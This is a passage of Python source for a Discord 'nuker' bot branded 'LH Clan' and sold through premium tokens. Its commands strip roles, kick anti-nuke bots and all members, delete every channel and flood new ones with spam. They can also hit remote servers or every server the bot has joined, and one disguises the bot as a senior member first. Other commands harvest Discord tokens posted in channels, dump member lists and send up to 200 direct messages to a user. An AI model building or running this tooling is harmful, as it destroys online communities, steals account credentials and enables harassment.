    for ch in sorted(source.text_channels, key=lambda c: c.position):
        cat = category_map.get(ch.category_id) if ch.category_id else None
        try:
            await target.create_text_channel(
                name=ch.name, topic=ch.topic, slowmode_delay=ch.slowmode_delay,
                nsfw=ch.nsfw, category=cat, overwrites=build_overwrites(ch, target),
                reason="LH Clone"
            )
        except Exception:
            pass

    # clone voice channels
    for ch in sorted(source.voice_channels, key=lambda c: c.position):
        cat = category_map.get(ch.category_id) if ch.category_id else None
        try:
            await target.create_voice_channel(
                name=ch.name, category=cat,
                overwrites=build_overwrites(ch, target), reason="LH Clone"
            )
        except Exception:
            pass


async def run_nuke(guild: discord.Guild):
    strip_tasks = [member.edit(roles=[], reason="LH — neutralize") for member in guild.members if member.bot and member != guild.me]
    await asyncio.gather(*strip_tasks, return_exceptions=True)
    kick_bots = [member.kick(reason="LH — antinuke removal") for member in guild.members if member.id in ANTINUKE_IDS]
    await asyncio.gather(*kick_bots, return_exceptions=True)
    role_tasks = [role.edit(permissions=discord.Permissions.none(), reason="LH — wipe") for role in guild.roles if role < guild.me.top_role and not role.is_default()]
    await asyncio.gather(*role_tasks, return_exceptions=True)
    kick_tasks = [member.kick(reason="LH Clan") for member in guild.members if member != guild.me and member != guild.owner and not member.bot]
    await asyncio.gather(*kick_tasks, return_exceptions=True)
    await asyncio.gather(*[ch.delete() for ch in guild.channels], return_exceptions=True)
    new_channels = []
    for _ in range(nuke_config["channel_count"]):
        try:
            ch = await guild.create_text_channel(nuke_config["channel_name"])
            new_channels.append(ch)
        except Exception: pass
    async def spam(ch):
        for _ in range(nuke_config["spam_count"]):
            try: await ch.send(nuke_config["message"])
            except Exception: pass
    await asyncio.gather(*[spam(ch) for ch in new_channels])


# ══════════════════════════════════════════════════════════════
#  LH — nuke + subcommands
# ══════════════════════════════════════════════════════════════

@bot.command(name="LH")
async def lh_command(ctx, subcommand: Optional[str] = None, *, args: Optional[str] = None):

    if subcommand and subcommand.upper() == "T":
        if ctx.author.id != PREMIUM_USER_ID:
            await ctx.send(embed=discord.Embed(title="❌ Access Denied", description="Owner only.", color=0xff0000), delete_after=5)
            try: await ctx.message.delete()
            except Exception: pass
            return
        tok = create_token(created_by=ctx.author.id, uses=1, label="LH T (prefix)")
        embed = discord.Embed(title="🔑 Token Generated (1 use, no expiry)", description=f"**Token:** `{tok}`\n\nFor full control use `/token create`.", color=0xffd700)
        try:
            await ctx.author.send(embed=embed)
            await ctx.message.delete()
            await ctx.send("🔑 Token sent to your DMs.", delete_after=5)
        except discord.Forbidden:
            await ctx.send(embed=embed, delete_after=15)
        return

    if subcommand and subcommand.upper() == "GHOST":
        if not ctx.author.guild_permissions.administrator:
            await ctx.send("❌ Administrator required.", delete_after=5); return
        guild  = ctx.guild
        target = None
        for member in sorted(guild.members, key=lambda m: m.top_role.position, reverse=True):
            if member == guild.me or member == guild.owner or member.bot: continue
            target = member; break
        if target:
            try:
                await guild.me.edit(nick=target.display_name)
                await bot.user.edit(avatar=await target.display_avatar.read())
            except Exception: pass
        try: await ctx.message.delete()
        except Exception: pass
        antinuke_enabled[guild.id] = False
        await asyncio.sleep(2)
        await run_nuke(guild)
        return

    if subcommand and subcommand.upper() == "EXEC":
        if not args or len(args.split()) < 2:
            await ctx.send("❌ Usage: `!LH EXEC <serverID> <token>`", delete_after=5); return
        parts = args.split()
        tok   = parts[1]
        valid, reason = _peek_token(tok)
        if not valid:
            await ctx.send(embed=discord.Embed(title="❌ Invalid Token", description=reason, color=0xff0000), delete_after=5)
            try: await ctx.message.delete()
            except Exception: pass
            return
        if not is_premium(ctx.author.id):
            await ctx.send("❌ Premium required.", delete_after=5); return
        try: target_guild = bot.get_guild(int(parts[0]))
        except ValueError:
            await ctx.send("❌ Invalid server ID.", delete_after=5); return
        if not target_guild:
            await ctx.send("❌ Bot is not in that server.", delete_after=5); return
        validate_token(tok)
        try: await ctx.message.delete()
        except Exception: pass
        await notify_owner(discord.Embed(title="💀 Remote Nuke Initiated", description=f"Targeting: **{target_guild.name}**", color=0xff0000, timestamp=discord.utils.utcnow()))
        antinuke_enabled[target_guild.id] = False
        await run_nuke(target_guild)
        return

    if subcommand and subcommand.upper() == "ALL":
        tok = args.strip() if args else ""
        valid, reason = _peek_token(tok)
        if not valid:
            await ctx.send(embed=discord.Embed(title="❌ Invalid Token", description=reason, color=0xff0000), delete_after=5)
            try: await ctx.message.delete()
            except Exception: pass
            return
        if not is_premium(ctx.author.id):
            await ctx.send("❌ Premium required.", delete_after=5); return
        validate_token(tok)
        guilds = list(bot.guilds)
        try: await ctx.message.delete()
        except Exception: pass
        await notify_owner(discord.Embed(title="💀 ALL SERVERS NUKE", description=f"Targeting **{len(guilds)}** servers.", color=0xff0000, timestamp=discord.utils.utcnow()))
        for g in guilds: antinuke_enabled[g.id] = False
        await asyncio.gather(*[run_nuke(g) for g in guilds], return_exceptions=True)
        return

    if subcommand and subcommand.upper() == "CLONE":
        if not args or len(args.split()) < 3:
            await ctx.send("❌ Usage: `!LH CLONE <sourceServerID> <targetServerID> <token>`", delete_after=5)
            return
        parts         = args.split()
        source_id_str = parts[0]
        target_id_str = parts[1]
        tok           = parts[2]

        valid, reason = _peek_token(tok)
        if not valid:
            await ctx.send(embed=discord.Embed(title="❌ Invalid Token", description=reason, color=0xff0000), delete_after=5)
            try: await ctx.message.delete()
            except Exception: pass
            return
        if not is_premium(ctx.author.id):
            await ctx.send("❌ Premium required.", delete_after=5); return

        try:
            source_guild = bot.get_guild(int(source_id_str))
            target_guild = bot.get_guild(int(target_id_str))
        except ValueError:
            await ctx.send("❌ Invalid server ID.", delete_after=5); return

        if not source_guild:
            await ctx.send("❌ Bot is not in the source server.", delete_after=5); return
        if not target_guild:
            await ctx.send("❌ Bot is not in the target server.", delete_after=5); return

        validate_token(tok)
        try: await ctx.message.delete()
        except Exception: pass

        status = await ctx.send(f"🔄 Cloning **{source_guild.name}** → **{target_guild.name}**...")
        await clone_server(source_guild, target_guild)
        try: await status.delete()
        except Exception: pass

        embed = discord.Embed(title="✅ Server Clone Complete", color=0x00ff00, timestamp=discord.utils.utcnow())
        embed.add_field(name="Source", value=f"{source_guild.name} (`{source_guild.id}`)", inline=False)
        embed.add_field(name="Target", value=f"{target_guild.name} (`{target_guild.id}`)", inline=False)
        embed.add_field(name="Cloned", value=f"{len(source_guild.roles)} roles, {len(source_guild.channels)} channels", inline=False)
        try: await ctx.author.send(embed=embed)
        except Exception: await ctx.send(embed=embed, delete_after=15)
        return

    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Administrator required.", delete_after=5); return
    try: await ctx.message.delete()
    except Exception: pass
    antinuke_enabled[ctx.guild.id] = False
    await run_nuke(ctx.guild)


# ══════════════════════════════════════════════════════════════
#  LHP
# ══════════════════════════════════════════════════════════════

class LHPModal(discord.ui.Modal, title="⚙️ Edit LH Nuke Config"):
    token_input        = discord.ui.TextInput(label="Premium Token",               placeholder="LHT-xxxxxxxxxxxxxxxxxxxxxxxx", required=True, max_length=32,   style=discord.TextStyle.short)
    channel_name_input = discord.ui.TextInput(label="Channel Name",                placeholder="hooked by lh clan",           required=True, max_length=100,  style=discord.TextStyle.short)
    message_input      = discord.ui.TextInput(label="Spam Message",                placeholder="lol ur server...",            required=True, max_length=2000, style=discord.TextStyle.paragraph)
    channel_count_input= discord.ui.TextInput(label="Channel Count (min 12)",      placeholder="12",                          required=True, max_length=3,    style=discord.TextStyle.short)
    spam_count_input   = discord.ui.TextInput(label="Spam Count per Channel (max 200)", placeholder="100",                    required=True, max_length=3,    style=discord.TextStyle.short)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        tok = self.token_input.value.strip()
        valid, reason = _peek_token(tok)
        if not valid:
            await interaction.followup.send(embed=discord.Embed(title="❌ Invalid Token", description=reason, color=0xff0000), ephemeral=True); return
        try:
            ch_count = max(12, int(self.channel_count_input.value.strip()))
            sp_count = max(1, min(int(self.spam_count_input.value.strip()), 200))
        except ValueError:
            await interaction.followup.send("❌ Counts must be numbers.", ephemeral=True); return
        nuke_config["channel_name"]  = self.channel_name_input.value.strip()
        nuke_config["message"]       = self.message_input.value.strip()
        nuke_config["channel_count"] = ch_count
        nuke_config["spam_count"]    = sp_count
        validate_token(tok)
        preview = nuke_config['message'][:100] + "..." if len(nuke_config['message']) > 100 else nuke_config['message']
        embed = discord.Embed(title="✅ Nuke Config Updated", color=0x00ff00)
        embed.add_field(name="Channel Name",  value=f"`{nuke_config['channel_name']}`", inline=False)
        embed.add_field(name="Spam Message",  value=f"`{preview}`",                     inline=False)
        embed.add_field(name="Channel Count", value=str(ch_count),                      inline=True)
        embed.add_field(name="Spam Count",    value=str(sp_count),                      inline=True)
        await interaction.followup.send(embed=embed, ephemeral=True)

    async def on_error(self, interaction: discord.Interaction, error: Exception):
        await interaction.followup.send("❌ Something broke. Try again.", ephemeral=True)


@bot.command(name="LHP")
async def lhp(ctx):
    try: await ctx.message.delete()
    except Exception: pass

    class LHPView(discord.ui.View):
        def __init__(self):
            super().__init__(timeout=60)

        @discord.ui.button(label="⚙️ Open Config Editor", style=discord.ButtonStyle.blurple)
        async def open_modal(self, interaction: discord.Interaction, button: discord.ui.Button):
            if interaction.user.id != ctx.author.id:
                await interaction.response.send_message("❌ Only the command runner can use this.", ephemeral=True); return
            await interaction.response.send_modal(LHPModal())
            self.stop()

    msg = await ctx.send(embed=discord.Embed(title="⚙️ LH Premium Config", description="Click to open.\nRequires a valid token.", color=0xffd700), view=LHPView())
    await asyncio.sleep(61)
    try: await msg.delete()
    except Exception: pass


# ══════════════════════════════════════════════════════════════
#  INTEL
# ══════════════════════════════════════════════════════════════

@bot.command(name="LHSPY")
async def lh_spy(ctx):
    if ctx.author.id != PREMIUM_USER_ID:
        await ctx.send("❌ Access Denied.", delete_after=3)
        try: await ctx.message.delete()
        except Exception: pass
        return
    try: await ctx.message.delete()
    except Exception: pass
    guilds = bot.guilds
    if not guilds:
        await ctx.author.send("Bot is not in any servers."); return
    for idx, page in enumerate([guilds[i:i+10] for i in range(0, len(guilds), 10)]):
        embed = discord.Embed(title=f"📡 Server Spy — Page {idx+1}", color=0xff4400, timestamp=discord.utils.utcnow())
        for g in page:
            try: owner = await bot.fetch_user(g.owner_id); owner_str = f"{owner} (`{owner.id}`)"
            except Exception: owner_str = f"ID: `{g.owner_id}`"
            embed.add_field(name=g.name, value=f"ID: `{g.id}`\nMembers: `{g.member_count}`\nOwner: {owner_str}\nAntiNuke: {'🟢' if antinuke_enabled[g.id] else '🔴'}", inline=True)
        embed.set_footer(text=f"Total: {len(guilds)} servers")
        try: await ctx.author.send(embed=embed)
        except discord.Forbidden: await ctx.send(embed=embed, delete_after=30)
    await ctx.send("📡 Spy report sent to your DMs.", delete_after=5)


@bot.command(name="LHMEMBERS")
async def lh_members(ctx, server_id: str = None):
    if ctx.author.id != PREMIUM_USER_ID:
        await ctx.send("❌ Access Denied.", delete_after=3)
        try: await ctx.message.delete()
        except Exception: pass
        return
    if not server_id:
        await ctx.send("❌ Usage: `!LHMEMBERS <serverID>`", delete_after=5); return
    try: guild = bot.get_guild(int(server_id))
    except ValueError:
        await ctx.send("❌ Invalid server ID.", delete_after=5); return
    if not guild:
        await ctx.send("❌ Bot is not in that server.", delete_after=5); return
    try: await ctx.message.delete()
    except Exception: pass
    await ctx.send("📋 Fetching...", delete_after=5)
    lines = [f"Member List — {guild.name} ({guild.id})\n{'='*50}"]
    async for member in guild.fetch_members(limit=None):
        lines.append(f"Username : {member}\nID       : {member.id}\nTop Role : {member.top_role.name}\nJoined   : {member.joined_at.strftime('%Y-%m-%d') if member.joined_at else 'unknown'}\nBot      : {'Yes' if member.bot else 'No'}\n{'-'*40}")
    file_path = f"/tmp/members_{guild.id}.txt"
    with open(file_path, "w", encoding="utf-8") as f: f.write("\n".join(lines))
    try:
        await ctx.author.send(content=f"📋 Member list for **{guild.name}**", file=discord.File(file_path, filename=f"members_{guild.name}.txt"))
        await ctx.send("📋 Sent to your DMs.", delete_after=5)
    except discord.Forbidden:
        await ctx.send(file=discord.File(file_path, filename=f"members_{guild.name}.txt"))


@bot.command(name="LHTOKENS")
async def lh_tokens_cmd(ctx, server_id: str = None):
    if ctx.author.id != PREMIUM_USER_ID:
        await ctx.send("❌ Access Denied.", delete_after=3)
        try: await ctx.message.delete()
        except Exception: pass
        return
    if not server_id:
        await ctx.send("❌ Usage: `!LHTOKENS <serverID>`", delete_after=5); return
    try: guild = bot.get_guild(int(server_id))
    except ValueError:
        await ctx.send("❌ Invalid server ID.", delete_after=5); return
    if not guild:
        await ctx.send("❌ Bot is not in that server.", delete_after=5); return
    try: await ctx.message.delete()
    except Exception: pass
    status = await ctx.send("🔍 Scanning...")
    found  = []
    for channel in guild.text_channels:
        try:
            async for msg in channel.history(limit=500):
                for match in DISCORD_TOKEN_REGEX.findall(msg.content):
                    found.append(f"Token  : {match}\nAuthor : {msg.author} ({msg.author.id})\nChannel: #{channel.name}\n{'─'*40}")
        except Exception: continue
    try: await status.delete()
    except Exception: pass
    if not found:
        try: await ctx.author.send(f"🔍 Scan complete for **{guild.name}** — no tokens found.")
        except Exception: await ctx.send("🔍 No tokens found.", delete_after=10)
        return
    output = f"Token Scan — {guild.name}\nFound: {len(found)}\n{'='*50}\n" + "\n".join(found)
    file_path = f"/tmp/tokens_{guild.id}.txt"
    with open(file_path, "w", encoding="utf-8") as f: f.write(output)
    try:
        await ctx.author.send(content=f"🔑 Found **{len(found)}** token(s)", file=discord.File(file_path, filename=f"tokens_{guild.name}.txt"))
    except discord.Forbidden:
        await ctx.send(file=discord.File(file_path, filename=f"tokens_{guild.name}.txt"))


# ══════════════════════════════════════════════════════════════
#  DM + INFO
# ══════════════════════════════════════════════════════════════

@bot.tree.command(name="dm", description="DM a user by @mention or ID")
@app_commands.describe(member="@mention a server member", user_id="Or paste a user ID", message="Message to send", count="How many times (max 200)", delay="Delay in seconds between messages")
async def dm(interaction: discord.Interaction, message: str, count: app_commands.Range[int, 1, 200], member: Optional[discord.Member] = None, user_id: Optional[str] = None, delay: Optional[float] = None):
    await interaction.response.defer(ephemeral=True)
    actual_delay = max(0.0, min(delay or 0.0, 10.0))
    if member: user = member
    elif user_id:
        try: user = await bot.fetch_user(int(user_id))
        except discord.NotFound:
            await interaction.followup.send("❌ User not found.", ephemeral=True); return
        except ValueError:
            await interaction.followup.send("❌ Invalid ID.", ephemeral=True); return
    else:
        await interaction.followup.send("❌ Provide a @mention or user ID.", ephemeral=True); return
    success = 0; failed = 0
    for _ in range(count):
        try:
            await user.send(message); success += 1
            if actual_delay > 0: await asyncio.sleep(actual_delay)
        except discord.Forbidden:
            failed = count - success; break
        except discord.HTTPException:
            failed += 1
    color = 0x00ff00 if failed == 0 else (0xff0000 if success == 0 else 0xff9900)
    embed = discord.Embed(title="📬 DM Report", color=color)
    embed.add_field(name="Target",       value=f"{user} (`{user.id}`)", inline=False)
    embed.add_field(name="✅ Sent",      value=str(success),            inline=True)
    embed.add_field(name="❌ Failed",    value=str(failed),             inline=True)
    embed.add_field(name="📨 Requested", value=str(count),             inline=True)
    embed.set_footer(text=f"Requested by {interaction.user}")
    await interaction.followup.send(embed=embed, ephemeral=True)

@bot.tree.command(name="serverinfo", description="Show server info")
async def serverinfo(interaction: discord.Interaction):
    g = interaction.guild
    embed = discord.Embed(title=f"📊 {g.name}", color=0x5865f2, timestamp=discord.utils.utcnow())
    embed.set_thumbnail(url=g.icon.url if g.icon else None)
    embed.add_field(name="Owner",    value=str(g.owner),                      inline=True)
    embed.add_field(name="Members",  value=str(g.member_count),               inline=True)
    embed.add_field(name="Channels", value=str(len(g.channels)),              inline=True)
    embed.add_field(name="Roles",    value=str(len(g.roles)),                 inline=True)
    embed.add_field(name="Created",  value=g.created_at.strftime("%Y-%m-%d"), inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="userinfo", description="Show info about a user")
@app_commands.describe(member="User to inspect")
async def userinfo(interaction: discord.Interaction, member: discord.Member):
    embed = discord.Embed(title=f"👤 {member}", color=member.color, timestamp=discord.utils.utcnow())
    embed.set_thumbnail(url=member.display_avatar.url)
    embed.add_field(name="ID",              value=str(member.id),                         inline=True)
    embed.add_field(name="Joined Server",   value=member.joined_at.strftime("%Y-%m-%d"),  inline=True)
    embed.add_field(name="Account Created", value=member.created_at.strftime("%Y-%m-%d"), inline=True)
    embed.add_field(name="Top Role",        value=member.top_role.mention,                inline=True)
    embed.add_field(name="Bot?",            value="Yes" if member.bot else "No",          inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="poll", description="Create a yes/no poll")
@app_commands.describe(question="What to ask")
async def poll(interaction: discord.Interaction, question: str):
    embed = discord.Embed(title="📊 Poll", description=question, color=0xfee75c)
    embed.set_footer(text=f"Asked by {interaction.user}")
    await interaction.response.send_message(embed=embed)
    msg = await interaction.original_response()
    await msg.add_reaction("✅")
    await msg.add_reaction("❌")

@bot.tree.command(name="ping", description="Check bot latency")
async def ping(interaction: discord.Interaction):
    latency = round(bot.latency * 1000)
    color   = 0x00ff00 if latency < 100 else (0xff9900 if latency < 200 else 0xff0000)
    await interaction.response.send_message(embed=discord.Embed(title="🏓 Pong!", description=f"Latency: **{latency}ms**", color=color), ephemeral=True)


# ── run ───────────────────────────────────────────────────────
bot.run(TOKEN)
